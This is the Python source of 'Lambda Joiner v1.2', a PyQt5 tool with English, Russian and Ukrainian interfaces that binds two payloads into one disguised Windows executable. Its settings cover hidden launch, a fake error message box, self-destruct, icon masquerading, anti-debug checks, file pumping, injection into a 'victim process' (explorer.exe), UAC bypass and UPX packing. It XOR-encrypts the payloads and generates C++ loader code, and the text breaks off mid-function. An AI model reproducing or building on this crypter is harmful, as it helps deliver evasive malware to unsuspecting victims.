import sys
import os
import subprocess
import random
import string
import json
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLineEdit, QLabel, QFileDialog, QTextEdit,
                             QCheckBox, QComboBox, QGroupBox, QDesktopWidget, QRadioButton,
                             QSpinBox, QScrollArea, QGridLayout, QSizeGrip)
from PyQt5.QtCore import Qt, QPoint, QPropertyAnimation
from PyQt5.QtGui import QFont, QIcon, QPixmap
from colorama import init, Fore, Style

# --- Translation Dictionary ---
# I've added new keys for logging the new steps in the build process.
translations = {
    "en-GB": {
        "window_title": "Lambda Joiner v1.2 (Fixed)",
        "lang_label": "Language:",
        "file1_group": "First Payload",
        "run_hidden": "Run hidden",
        "payload2_group": "Second Payload",
        "launch_behavior_group": "Launch Behaviour",
        "msgbox_check": "Show MessageBox on launch",
        "msgbox_type_label": "Type:",
        "msgbox_type_error": "Error",
        "msgbox_type_info": "Information",
        "msgbox_type_warning": "Warning",
        "msgbox_title_label": "Title:",
        "msgbox_text_label": "Text:",
        "self_destruct_check": "Self-destruct after launch",
        "self_hide_check": "Hide file after launch (Hidden attribute)",
        "masquerade_group": "File Masquerading",
        "icon_file_label": "Icon file (.ico):",
        "evasion_obfuscation_group": "Evasion & Obfuscation",
        "anti_debug_check": "Anti-Debug (check for debugger)",
        "pump_file_check": "Pump file up to (MB):",
        "injection_group": "Injection Settings (Expert)",
        "injection_check": "Inject into process (for 1st payload)",
        "injection_target_label": "Victim process:",
        "uac_bypass_group": "UAC Bypass",
        "uac_bypass_check": "Bypass UAC (for selected payload)",
        "uac_bypass_payload_label": "Apply to:",
        "uac_bypass_payload_none": "None",
        "uac_bypass_payload_file1": "First Payload",
        "uac_bypass_payload_file2": "Second Payload",
        "upx_group": "UPX Settings",
        "upx_pack_check": "Pack final file with UPX",
        "upx_level_label": "Compression Level:",
        "upx_warning": "Warning: UPX packing can significantly increase detection rates.",
        "output_file_label": "Save as (.exe):",
        "build_button": "Create λ-Build",
        "log_label": ">>> Execution Log:",
        "browse_button": "Browse...",
        "save_as_button": "Save as...",
        "default_msgbox_title": "Error",
        "default_msgbox_text": "Failed to start the application.",
        "dialog_select_file": "Select File",
        "dialog_select_icon": "Select Icon File",
        "dialog_save_executable": "Save Executable File",
        "log_stage1": "Stage 1: Data collection and validation...",
        "log_error_mandatory_fields": "ERROR: Mandatory fields (First Payload and Output file) are not filled.",
        "log_error_compiler_not_found": "ERROR: Compiler not found: {path}",
        "log_error_rcedit_not_found": "WARNING: rcedit not found at {path}. Skipping icon modification.",
        "log_error_upx_not_found": "WARNING: UPX executable not found at {path}. Skipping UPX packing.",
        "log_stage2": "\nStage 2: Data preparation...",
        "log_data_encrypted": "-> Data encrypted successfully.",
        "log_cpp_generated": "-> C++ source code generated.",
        "log_stage3": "\nStage 3: Compiling...",
        "log_main_compile_ok": "-> Main compilation completed successfully.",
        "log_stage4": "\nStage 4: Modifying resources...",
        "log_set_icon_ok": "-> Icon set successfully.",
        "log_stage5": "\nStage 5: Appending payloads...",
        "log_append_ok": "-> Payloads appended successfully.",
        "log_stage6": "\nStage 6: Pumping file...",
        "log_pump_success": "-> File successfully pumped to {size} MB.",
        "log_pump_warn_size": "-> WARNING: Target size is less than or equal to current size. Skipping.",
        "log_pump_error": "-> Pumping ERROR: {e}",
        "log_stage7": "\nStage 7: Packing with UPX...",
        "log_upx_pack_ok": "-> UPX packing completed.",
        "log_upx_error": "-> UPX packing failed.",
        "log_final_success": "\n======================================\nSUCCESS! Legendary file has been created:\n{path}\n======================================",
        "log_critical_error": "\nCRITICAL ERROR DURING ONE OF THE STAGES: {e}",
        "log_stage8": "\nStage 8: Cleaning up temporary files...",
        "log_file_deleted": "-> Temporary file {file} deleted.",
        "log_command": "   Command: {cmd}",
        "log_error_command": "ERROR: {error}",
        "log_sound_error": "SOUND ERROR: Could not play {sound}. {e}",
        "log_sound_not_found": "WARNING: Sound file not found: {sound}"
    },
    "ru": {
        "window_title": "Lambda Joiner v1.2 (Исправлено)",
        "lang_label": "Язык:",
        "file1_group": "Первая нагрузка",
        "run_hidden": "Запустить скрыто",
        "payload2_group": "Вторая нагрузка",
        "launch_behavior_group": "Поведение при запуске",
        "msgbox_check": "Показать MessageBox при запуске",
        "msgbox_type_label": "Тип:",
        "msgbox_type_error": "Ошибка",
        "msgbox_type_info": "Информация",
        "msgbox_type_warning": "Предупреждение",
        "msgbox_title_label": "Заголовок:",
        "msgbox_text_label": "Текст:",
        "self_destruct_check": "Самоуничтожение после запуска",
        "self_hide_check": "Скрыть файл после запуска (атрибут 'Скрытый')",
        "masquerade_group": "Маскировка файла",
        "icon_file_label": "Файл иконки (.ico):",
        "evasion_obfuscation_group": "Уклонение и Обфускация",
        "anti_debug_check": "Anti-Debug (проверка на отладчик)",
        "pump_file_check": "Накачать файл до (МБ):",
        "injection_group": "Настройки инъекции (Эксперт)",
        "injection_check": "Инъекция в процесс (для 1-й нагрузки)",
        "injection_target_label": "Процесс-жертва:",
        "uac_bypass_group": "Обход UAC",
        "uac_bypass_check": "Обход UAC (для выбранной нагрузки)",
        "uac_bypass_payload_label": "Применить к:",
        "uac_bypass_payload_none": "Нет",
        "uac_bypass_payload_file1": "Первая нагрузка",
        "uac_bypass_payload_file2": "Вторая нагрузка",
        "upx_group": "Настройки UPX",
        "upx_pack_check": "Упаковать финальный файл с помощью UPX",
        "upx_level_label": "Уровень сжатия:",
        "upx_warning": "Предупреждение: Упаковка UPX может значительно увеличить детекты.",
        "output_file_label": "Сохранить как (.exe):",
        "build_button": "Создать λ-билд",
        "log_label": ">>> Лог выполнения:",
        "browse_button": "Обзор...",
        "save_as_button": "Сохранить...",
        "default_msgbox_title": "Ошибка",
        "default_msgbox_text": "Не удалось запустить приложение.",
        "dialog_select_file": "Выберите файл",
        "dialog_select_icon": "Выберите файл иконки",
        "dialog_save_executable": "Сохранить исполняемый файл",
        "log_stage1": "Этап 1: Сбор данных и валидация...",
        "log_error_mandatory_fields": "ОШИБКА: Обязательные поля (Первая нагрузка и Выходной файл) не заполнены.",
        "log_error_compiler_not_found": "ОШИБКА: Компилятор не найден: {path}",
        "log_error_rcedit_not_found": "ПРЕДУПРЕЖДЕНИЕ: rcedit не найден по пути {path}. Пропускаем изменение иконки.",
        "log_error_upx_not_found": "ПРЕДУПРЕЖДЕНИЕ: UPX не найден по пути {path}. Пропускаем упаковку.",
        "log_stage2": "\nЭтап 2: Подготовка данных...",
        "log_data_encrypted": "-> Данные успешно зашифрованы.",
        "log_cpp_generated": "-> Исходный код C++ сгенерирован.",
        "log_stage3": "\nЭтап 3: Компиляция...",
        "log_main_compile_ok": "-> Основная компиляция успешно завершена.",
        "log_stage4": "\nЭтап 4: Изменение ресурсов...",
        "log_set_icon_ok": "-> Иконка успешно установлена.",
        "log_stage5": "\nЭтап 5: Добавление нагрузок...",
        "log_append_ok": "-> Полезные нагрузки успешно добавлены.",
        "log_stage6": "\nЭтап 6: Накачка файла...",
        "log_pump_success": "-> Файл успешно увеличен до {size} МБ.",
        "log_pump_warn_size": "-> ПРЕДУПРЕЖДЕНИЕ: Целевой размер меньше или равен текущему. Пропускаем.",
        "log_pump_error": "-> ОШИБКА накачки: {e}",
        "log_stage7": "\nЭтап 7: Упаковка с помощью UPX...",
        "log_upx_pack_ok": "-> Упаковка UPX завершена.",
        "log_upx_error": "-> Ошибка упаковки UPX.",
        "log_final_success": "\n======================================\nУСПЕХ! Легендарный файл создан:\n{path}\n======================================",
        "log_critical_error": "\nКРИТИЧЕСКАЯ ОШИБКА НА ОДНОМ ИЗ ЭТАПОВ: {e}",
        "log_stage8": "\nЭтап 8: Очистка временных файлов...",
        "log_file_deleted": "-> Временный файл {file} удален.",
        "log_command": "   Команда: {cmd}",
        "log_error_command": "ОШИБКА: {error}",
        "log_sound_error": "ОШИБКА ЗВУКА: Не удалось воспроизвести {sound}. {e}",
        "log_sound_not_found": "ПРЕДУПРЕЖДЕНИЕ: Звуковой файл не найден: {sound}"
    },
    "uk": {
        "window_title": "Lambda Joiner v1.2 (Виправлено)",
        "lang_label": "Мова:",
        "file1_group": "Перший пейлоад",
        "run_hidden": "Запустити приховано",
        "payload2_group": "Другий пейлоад",
        "launch_behavior_group": "Поведінка при запуску",
        "msgbox_check": "Показати MessageBox при запуску",
        "msgbox_type_label": "Тип:",
        "msgbox_type_error": "Помилка",
        "msgbox_type_info": "Інформація",
        "msgbox_type_warning": "Попередження",
        "msgbox_title_label": "Заголовок:",
        "msgbox_text_label": "Текст:",
        "self_destruct_check": "Самознищення після запуску",
        "self_hide_check": "Приховати файл після запуску (атрибут 'Прихований')",
        "masquerade_group": "Маскування файлу",
        "icon_file_label": "Файл іконки (.ico):",
        "evasion_obfuscation_group": "Ухилення та Обфускація",
        "anti_debug_check": "Anti-Debug (перевірка на відладчик)",
        "pump_file_check": "Накачати файл до (МБ):",
        "injection_group": "Налаштування ін'єкції (Експерт)",
        "injection_check": "Ін'єкція в процес (для 1-го пейлоаду)",
        "injection_target_label": "Процес-жертва:",
        "uac_bypass_group": "Обхід UAC",
        "uac_bypass_check": "Обхід UAC (для обраного пейлоаду)",
        "uac_bypass_payload_label": "Застосувати до:",
        "uac_bypass_payload_none": "Немає",
        "uac_bypass_payload_file1": "Перший пейлоад",
        "uac_bypass_payload_file2": "Другий пейлоад",
        "upx_group": "Налаштування UPX",
        "upx_pack_check": "Упакувати фінальний файл за допомогою UPX",
        "upx_level_label": "Рівень стиснення:",
        "upx_warning": "Попередження: Упаковка UPX може значно збільшити детекти.",
        "output_file_label": "Зберегти як (.exe):",
        "build_button": "Створити λ-білд",
        "log_label": ">>> Лог виконання:",
        "browse_button": "Огляд...",
        "save_as_button": "Зберегти...",
        "default_msgbox_title": "Помилка",
        "default_msgbox_text": "Не вдалося запустити програму.",
        "dialog_select_file": "Оберіть файл",
        "dialog_select_icon": "Оберіть файл іконки",
        "dialog_save_executable": "Зберегти виконуваний файл",
        "log_stage1": "Етап 1: Збір даних та валідація...",
        "log_error_mandatory_fields": "ПОМИЛКА: Обов'язкові поля (Перший пейлоад та Вихідний файл) не заповнені.",
        "log_error_compiler_not_found": "ПОМИЛКА: Компілятор не знайдено: {path}",
        "log_error_rcedit_not_found": "ПОПЕРЕДЖЕННЯ: rcedit не знайдено за шляхом {path}. Пропускаємо зміну іконки.",
        "log_error_upx_not_found": "ПОПЕРЕДЖЕННЯ: UPX не знайдено за шляхом {path}. Пропускаємо пакування.",
        "log_stage2": "\nЕтап 2: Підготовка даних...",
        "log_data_encrypted": "-> Дані успішно зашифровано.",
        "log_cpp_generated": "-> C++ код згенеровано.",
        "log_stage3": "\nЕтап 3: Компіляція...",
        "log_main_compile_ok": "-> Основну компіляцію завершено успішно.",
        "log_stage4": "\nЕтап 4: Зміна ресурсів...",
        "log_set_icon_ok": "-> Іконку успішно встановлено.",
        "log_stage5": "\nЕтап 5: Додавання пейлоадів...",
        "log_append_ok": "-> Пейлоади успішно додано.",
        "log_stage6": "\nЕтап 6: Накачування файлу...",
        "log_pump_success": "-> Файл успішно збільшено до {size} МБ.",
        "log_pump_warn_size": "-> ПОПЕРЕДЖЕННЯ: Цільовий розмір менший або рівний поточному. Пропускаємо.",
        "log_pump_error": "-> ПОМИЛКА накачування: {e}",
        "log_stage7": "\nЕтап 7: Упаковка за допомогою UPX...",
        "log_upx_pack_ok": "-> Упаковка UPX завершена.",
        "log_upx_error": "-> Помилка пакування UPX.",
        "log_final_success": "\n======================================\nУСПІХ! Легендарний файл створено:\n{path}\n======================================",
        "log_critical_error": "\nКРИТИЧНА ПОМИЛКА НА ОДНОМУ З ЕТАПІВ: {e}",
        "log_stage8": "\nЕтап 8: Очищення тимчасових файлів...",
        "log_file_deleted": "-> Тимчасовий файл {file} видалено.",
        "log_command": "   Команда: {cmd}",
        "log_error_command": "ПОМИЛКА: {error}",
        "log_sound_error": "ПОМИЛКА ЗВУКУ: Не вдалося відтворити {sound}. {e}",
        "log_sound_not_found": "ПОПЕРЕДЖЕННЯ: Звуковий файл не знайдено: {sound}"
    }
}

# Initialization
init()
ascii_art_string = """
    /\\_____/\\
   /  o   o  \\
  ( ==  Y  == )
   )         (
  (           )
 ( ( )   ( ) )
(__(__)___(__)__)
Lambda Joiner v1.2
created by catdev btw
My Github: bit.ly/catdev_github

plz support me
Bitcoin: bc1qctxclq8eqpp6prgx07eymw34ma4v5t69dkpdw5
Ethereum: 0x666195090354F0D6DDc3c8F7169CEC2427039332
"""
print(Fore.YELLOW + ascii_art_string + Style.RESET_ALL)

try:
    from playsound import playsound
except ImportError:
    def playsound(sound, block=True):
        print(f"INFO: playsound library not found. Cannot play {sound}")

# --- NEW: Helper function to get resource paths correctly ---
def get_resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- NEW: Helper function to safely escape strings for C++ ---
def escape_cpp_string(s):
    """Escapes a string for safe embedding in C++ source code."""
    return s.replace('\\', '\\\\').replace('"', '\\"')

class CustomTitleBar(QWidget):
    """Custom title bar."""
    def __init__(self, parent, title=""):
        super().__init__(parent)
        self.parent = parent
        self.old_pos = None
        layout = QHBoxLayout(self)
        layout.setContentsMargins(10, 0, 5, 0)
        layout.setSpacing(10)
        self.title_icon = QLabel("λ", self)
        self.title_label = QLabel(title, self)
        layout.addWidget(self.title_icon)
        layout.addWidget(self.title_label)
        layout.addStretch()
        self.minimize_button = QPushButton("_", self)
        self.minimize_button.setFixedSize(30, 30)
        self.minimize_button.clicked.connect(self.parent.showMinimized)
        self.close_button = QPushButton("X", self)
        self.close_button.setFixedSize(30, 30)
        self.close_button.clicked.connect(self.parent.close)
        layout.addWidget(self.minimize_button)
        layout.addWidget(self.close_button)
        self.setFixedHeight(40)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton: self.old_pos = event.globalPos()
    def mouseMoveEvent(self, event):
        if self.old_pos:
            delta = QPoint(event.globalPos() - self.old_pos)
            self.parent.move(self.parent.x() + delta.x(), self.parent.y() + delta.y())
            self.old_pos = event.globalPos()
    def mouseReleaseEvent(self, event):
        if event.button() == Qt.LeftButton: self.old_pos = None

class LambdaJoinerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.current_lang = 'en-GB'
        self.lang_map = {0: 'en-GB', 1: 'ru', 2: 'uk'}
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.init_ui()
        self.center()
        self.lang_combo.setCurrentIndex(2) # Default to Ukrainian
        self.update_ui_texts()
        
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(500)
        self.animation.setStartValue(0)
        self.animation.setEndValue(1)
        self.animation.start()

    def tr(self, key, **kwargs):
        """Gets a translated string by its key."""
        lang_dict = translations.get(self.current_lang, translations['en-GB'])
        text = lang_dict.get(key, f"<{key}>")
        try:
            return text.format(**kwargs)
        except (KeyError, IndexError):
            return text

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def init_ui(self):
        self.main_container = QWidget(self)
        self.main_container.setObjectName("mainContainer")
        self.setStyleSheet("""
            #mainContainer { background-color: #1a1a1a; border: 1px solid #00ff7f; border-radius: 10px; }
            QWidget { color: #00ff7f; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
            QScrollArea { border: none; background-color: transparent; }
            #scrollAreaWidget { background-color: transparent; }
            CustomTitleBar { background-color: #222; } CustomTitleBar QLabel { color: #00ff7f; font-weight: bold; }
            CustomTitleBar QPushButton { background-color: transparent; color: #00ff7f; border: 1px solid #00ff7f; border-radius: 5px; font-weight: bold; }
            CustomTitleBar QPushButton:hover { background-color: #00ff7f; color: #1a1a1a; }
            QGroupBox { font-weight: bold; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 5px; color: #00ff7f; }
            QLineEdit { background-color: #2c2c2c; border: 1px solid #00ff7f; border-radius: 5px; padding: 8px; color: #e0e0e0; }
            QPushButton#buildButton { background-color: #00ff7f; color: #1a1a1a; border: none; border-radius: 5px; padding: 10px; font-weight: bold; }
            QPushButton#buildButton:hover { background-color: #33ff99; }
            QPushButton { background-color: #2c2c2c; color: #00ff7f; border: 1px solid #00ff7f; padding: 8px; }
            QPushButton:hover { background-color: #3e3e3e; }
            QCheckBox, QComboBox, QRadioButton, QSpinBox { padding: 5px; }
            QComboBox, QSpinBox { background-color: #2c2c2c; border: 1px solid #00ff7f; border-radius: 5px; }
            QTextEdit { background-color: #111; border: 1px solid #333; border-radius: 5px; }
            #warningLabel { color: #ffcc00; font-style: italic; }
        """)

        container_layout = QVBoxLayout(self.main_container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        self.title_bar = CustomTitleBar(self)
        container_layout.addWidget(self.title_bar)

        scroll_area = QScrollArea(self)
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        
        scroll_area_widget = QWidget()
        scroll_area_widget.setObjectName("scrollAreaWidget")
        
        grid_layout = QGridLayout(scroll_area_widget)
        grid_layout.setSpacing(10)
        
        lang_layout = QHBoxLayout()
        self.lang_label = QLabel()
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["English (UK)", "Русский", "Українська"])
        self.lang_combo.currentIndexChanged.connect(self.change_language)
        lang_layout.addWidget(self.lang_label)
        lang_layout.addWidget(self.lang_combo)
        lang_layout.addStretch()
        grid_layout.addLayout(lang_layout, 0, 0, 1, 2)

        left_column_layout = QVBoxLayout()
        
        self.file1_group = QGroupBox()
        file1_group_layout = QVBoxLayout(self.file1_group)
        file1_layout, self.file1_path_edit, self.file1_browse_btn = self._create_file_selector(lambda: self._browse_file(self.file1_path_edit))
        self.file1_hide_checkbox = QCheckBox()
        self.file1_hide_checkbox.setChecked(True)
        file1_group_layout.addLayout(file1_layout)
        file1_group_layout.addWidget(self.file1_hide_checkbox)
        left_column_layout.addWidget(self.file1_group)

        self.file2_group = QGroupBox()
        file2_group_layout = QVBoxLayout(self.file2_group)
        file2_path_layout, self.file2_path_edit, self.file2_browse_btn = self._create_file_selector(lambda: self._browse_file(self.file2_path_edit))
        self.file2_hide_checkbox = QCheckBox()
        self.file2_hide_checkbox.setChecked(True)
        file2_group_layout.addLayout(file2_path_layout)
        file2_group_layout.addWidget(self.file2_hide_checkbox)
        left_column_layout.addWidget(self.file2_group)
        
        self.launch_behavior_group = QGroupBox()
        launch_layout = QVBoxLayout(self.launch_behavior_group)
        self.msgbox_checkbox = QCheckBox()
        self.msgbox_checkbox.toggled.connect(self._toggle_msgbox_options)
        launch_layout.addWidget(self.msgbox_checkbox)

        msgbox_type_layout = QHBoxLayout()
        self.msgbox_type_label = QLabel()
        self.msgbox_type_combo = QComboBox()
        self.msgbox_type_combo.addItems([self.tr('msgbox_type_error'), self.tr('msgbox_type_info'), self.tr('msgbox_type_warning')])
        self.msgbox_type_combo.setCurrentIndex(0) # Default to Error
        msgbox_type_layout.addWidget(self.msgbox_type_label)
        msgbox_type_layout.addWidget(self.msgbox_type_combo)
        msgbox_type_layout.addStretch()
        launch_layout.addLayout(msgbox_type_layout)

        msgbox_title_layout = QHBoxLayout()
        self.msgbox_title_label = QLabel()
        self.msgbox_title_edit = QLineEdit()
        msgbox_title_layout.addWidget(self.msgbox_title_label)
        msgbox_title_layout.addWidget(self.msgbox_title_edit)
        launch_layout.addLayout(msgbox_title_layout)

        msgbox_text_layout = QHBoxLayout()
        self.msgbox_text_label = QLabel()
        self.msgbox_text_edit = QLineEdit()
        msgbox_text_layout.addWidget(self.msgbox_text_label)
        msgbox_text_layout.addWidget(self.msgbox_text_edit)
        launch_layout.addLayout(msgbox_text_layout)

        self.self_destruct_checkbox = QCheckBox()
        self.self_hide_checkbox = QCheckBox()
        launch_layout.addWidget(self.self_destruct_checkbox)
        launch_layout.addWidget(self.self_hide_checkbox)
        left_column_layout.addWidget(self.launch_behavior_group)
        self._toggle_msgbox_options(False)
        left_column_layout.addStretch()
        
        right_column_layout = QVBoxLayout()

        self.masquerade_group = QGroupBox()
        masquerade_layout = QVBoxLayout(self.masquerade_group)
        # REMOVED: Template EXE selector, as it wasn't implemented and adds complexity.
        icon_layout, self.icon_file_label, self.icon_path_edit, self.icon_browse_btn = self._create_file_selector(self._browse_icon, has_label=True)
        masquerade_layout.addLayout(icon_layout)
        right_column_layout.addWidget(self.masquerade_group)

        self.adv_group = QGroupBox()
        adv_layout = QVBoxLayout(self.adv_group)
        self.anti_debug_checkbox = QCheckBox()
        adv_layout.addWidget(self.anti_debug_checkbox)
        pump_layout = QHBoxLayout()
        self.pump_checkbox = QCheckBox()
        self.pump_size_spinbox = QSpinBox()
        self.pump_size_spinbox.setRange(1, 500)
        self.pump_size_spinbox.setValue(10)
        pump_layout.addWidget(self.pump_checkbox)
        pump_layout.addWidget(self.pump_size_spinbox)
        pump_layout.addStretch()
        adv_layout.addLayout(pump_layout)
        right_column_layout.addWidget(self.adv_group)

        self.injection_group = QGroupBox()
        injection_layout = QHBoxLayout(self.injection_group)
        self.injection_checkbox = QCheckBox()
        self.injection_checkbox.toggled.connect(self.file1_hide_checkbox.setDisabled)
        injection_layout.addWidget(self.injection_checkbox)
        self.injection_target_label = QLabel()
        injection_layout.addWidget(self.injection_target_label)
        self.injection_target_edit = QLineEdit("explorer.exe")
        injection_layout.addWidget(self.injection_target_edit)
        right_column_layout.addWidget(self.injection_group)

        self.uac_bypass_group = QGroupBox()
        uac_bypass_layout = QVBoxLayout(self.uac_bypass_group)
        self.uac_bypass_checkbox = QCheckBox()
        self.uac_bypass_checkbox.toggled.connect(self._toggle_uac_bypass_options)
        uac_bypass_layout.addWidget(self.uac_bypass_checkbox)

        uac_payload_layout = QHBoxLayout()
        self.uac_bypass_payload_label = QLabel()
        self.uac_bypass_payload_combo = QComboBox()
        self.uac_bypass_payload_combo.addItems([self.tr('uac_bypass_payload_none'), self.tr('uac_bypass_payload_file1'), self.tr('uac_bypass_payload_file2')])
        self.uac_bypass_payload_combo.setCurrentIndex(0)
        uac_payload_layout.addWidget(self.uac_bypass_payload_label)
        uac_payload_layout.addWidget(self.uac_bypass_payload_combo)
        uac_payload_layout.addStretch()
        uac_bypass_layout.addLayout(uac_payload_layout)
        right_column_layout.addWidget(self.uac_bypass_group)
        self._toggle_uac_bypass_options(False)

        self.upx_groupbox = QGroupBox()
        upx_layout = QVBoxLayout(self.upx_groupbox)
        self.upx_checkbox = QCheckBox()
        upx_layout.addWidget(self.upx_checkbox)
        upx_level_layout = QHBoxLayout()
        self.upx_level_label = QLabel()
        self.upx_level_combo = QComboBox()
        self.upx_level_combo.addItems([str(i) for i in range(1, 10)])
        self.upx_level_combo.setCurrentText("9")
        upx_level_layout.addWidget(self.upx_level_label)
        upx_level_layout.addWidget(self.upx_level_combo)
        upx_level_layout.addStretch()
        upx_layout.addLayout(upx_level_layout)
        self.upx_warning_label = QLabel()
        self.upx_warning_label.setObjectName("warningLabel")
        upx_layout.addWidget(self.upx_warning_label)
        right_column_layout.addWidget(self.upx_groupbox)
        right_column_layout.addStretch()
        
        grid_layout.addLayout(left_column_layout, 1, 0)
        grid_layout.addLayout(right_column_layout, 1, 1)

        output_layout, self.output_path_label, self.output_path_edit, self.output_browse_btn = self._create_file_selector(self._browse_output_file, is_save=True, has_label=True)
        grid_layout.addLayout(output_layout, 2, 0, 1, 2)
        
        self.build_button = QPushButton()
        self.build_button.setObjectName("buildButton")
        self.build_button.clicked.connect(self._process_files)
        grid_layout.addWidget(self.build_button, 3, 0, 1, 2)
        
        self.log_label = QLabel()
        grid_layout.addWidget(self.log_label, 4, 0, 1, 2)
        
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        grid_layout.addWidget(self.log_area, 5, 0, 1, 2)
        
        grid_layout.setRowStretch(5, 1)
        grid_layout.setColumnStretch(0, 1)
        grid_layout.setColumnStretch(1, 1)

        scroll_area.setWidget(scroll_area_widget)
        container_layout.addWidget(scroll_area)
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0,0,0,0)
        main_layout.addWidget(self.main_container)
        self.setLayout(main_layout)
        
        self.resize(1200, 900)

    def change_language(self, index):
        self.current_lang = self.lang_map[index]
        self.update_ui_texts()

    def update_ui_texts(self):
        self.title_bar.title_label.setText(self.tr('window_title'))
        self.lang_label.setText(self.tr('lang_label'))
        
        self.file1_group.setTitle(self.tr('file1_group'))
        self.file1_hide_checkbox.setText(self.tr('run_hidden'))
        self.file1_browse_btn.setText(self.tr('browse_button'))
        
        self.file2_group.setTitle(self.tr('payload2_group'))
        self.file2_browse_btn.setText(self.tr('browse_button'))
        self.file2_hide_checkbox.setText(self.tr('run_hidden'))

        self.launch_behavior_group.setTitle(self.tr('launch_behavior_group'))
        self.msgbox_checkbox.setText(self.tr('msgbox_check'))
        self.msgbox_type_label.setText(self.tr('msgbox_type_label'))
        self.msgbox_type_combo.setItemText(0, self.tr('msgbox_type_error'))
        self.msgbox_type_combo.setItemText(1, self.tr('msgbox_type_info'))
        self.msgbox_type_combo.setItemText(2, self.tr('msgbox_type_warning'))
        self.msgbox_title_label.setText(self.tr('msgbox_title_label'))
        self.msgbox_text_label.setText(self.tr('msgbox_text_label'))
        self.self_destruct_checkbox.setText(self.tr('self_destruct_check'))
        self.self_hide_checkbox.setText(self.tr('self_hide_check'))
        self.msgbox_title_edit.setText(self.tr('default_msgbox_title'))
        self.msgbox_text_edit.setText(self.tr('default_msgbox_text'))

        self.masquerade_group.setTitle(self.tr('masquerade_group'))
        self.icon_file_label.setText(self.tr('icon_file_label'))
        self.icon_browse_btn.setText(self.tr('browse_button'))

        self.adv_group.setTitle(self.tr('evasion_obfuscation_group'))
        self.anti_debug_checkbox.setText(self.tr('anti_debug_check'))
        self.pump_checkbox.setText(self.tr('pump_file_check'))
        self.injection_group.setTitle(self.tr('injection_group'))
        self.injection_checkbox.setText(self.tr('injection_check'))
        self.injection_target_label.setText(self.tr('injection_target_label'))
        
        self.uac_bypass_group.setTitle(self.tr('uac_bypass_group'))
        self.uac_bypass_checkbox.setText(self.tr('uac_bypass_check'))
        self.uac_bypass_payload_label.setText(self.tr('uac_bypass_payload_label'))
        self.uac_bypass_payload_combo.setItemText(0, self.tr('uac_bypass_payload_none'))
        self.uac_bypass_payload_combo.setItemText(1, self.tr('uac_bypass_payload_file1'))
        self.uac_bypass_payload_combo.setItemText(2, self.tr('uac_bypass_payload_file2'))

        self.upx_groupbox.setTitle(self.tr('upx_group'))
        self.upx_checkbox.setText(self.tr('upx_pack_check'))
        self.upx_level_label.setText(self.tr('upx_level_label'))
        self.upx_warning_label.setText(self.tr('upx_warning'))
        self.output_path_label.setText(self.tr('output_file_label'))
        self.output_browse_btn.setText(self.tr('save_as_button'))
        self.build_button.setText(self.tr('build_button'))
        self.log_label.setText(self.tr('log_label'))

    def _toggle_msgbox_options(self, checked):
        self.msgbox_type_label.setEnabled(checked)
        self.msgbox_type_combo.setEnabled(checked)
        self.msgbox_title_label.setEnabled(checked)
        self.msgbox_title_edit.setEnabled(checked)
        self.msgbox_text_label.setEnabled(checked)
        self.msgbox_text_edit.setEnabled(checked)

    def _toggle_uac_bypass_options(self, checked):
        self.uac_bypass_payload_label.setEnabled(checked)
        self.uac_bypass_payload_combo.setEnabled(checked)

    def _create_file_selector(self, browse_function, is_save=False, has_label=False):
        layout = QHBoxLayout()
        label = QLabel() if has_label else None
        if label:
            label.setFixedWidth(150)
            layout.addWidget(label)
        
        line_edit = QLineEdit()
        button = QPushButton()
        button.setFixedWidth(120)
        button.clicked.connect(browse_function)
        layout.addWidget(line_edit, 1)  
        layout.addWidget(button)
        
        if has_label:
            return layout, label, line_edit, button
        else:
            return layout, line_edit, button

    def _browse_file(self, line_edit):
        fname, _ = QFileDialog.getOpenFileName(self, self.tr('dialog_select_file'), '', 'All Files (*)')
        if fname: line_edit.setText(fname)

    def _browse_icon(self):
        fname, _ = QFileDialog.getOpenFileName(self, self.tr('dialog_select_icon'), '', 'Icon files (*.ico)')
        if fname: self.icon_path_edit.setText(fname)
    
    def _browse_output_file(self):
        fname, _ = QFileDialog.getSaveFileName(self, self.tr('dialog_save_executable'), '', 'Executable (*.exe)')
        if fname:
            if not fname.lower().endswith('.exe'): fname += '.exe'
            self.output_path_edit.setText(fname)

    def _log(self, key, **kwargs):
        message = self.tr(key, **kwargs)
        self.log_area.append(message)
        QApplication.processEvents()
        
    def _play_sound(self, sound_file):
        sound_path = get_resource_path(sound_file)
        if not os.path.exists(sound_path):
            self._log("log_sound_not_found", sound=sound_path)
            return
        try:
            playsound(sound_path, block=False)
        except Exception as e:
            self._log("log_sound_error", sound=sound_path, e=e)

    def _xor_crypt(self, data, key):
        key_len = len(key)
        key_bytes = key.encode('utf-8')
        return bytes([data[i] ^ key_bytes[i % key_len] for i in range(len(data))])

    def _generate_cpp_code(self, **kwargs):
        # Safely escape all string data coming from the UI
        xor_key = escape_cpp_string(kwargs['xor_key'])
        msg_title_escaped = escape_cpp_string(kwargs["msg_title"])
        msg_text_escaped = escape_cpp_string(kwargs["msg_text"])
        target_proc_escaped = escape_cpp_string(kwargs['target_proc'])
        file1_filename_escaped = escape_cpp_string(os.path.basename(kwargs['file1_filename']))
        file2_filename_escaped = escape_cpp_string(os.path.basename(kwargs['file2_filename'])) if kwargs['file2_size'] > 0 else ""

        anti_debug_logic = "if (IsDebuggerPresent()) return 1;" if kwargs['use_anti_debug'] else ""
        
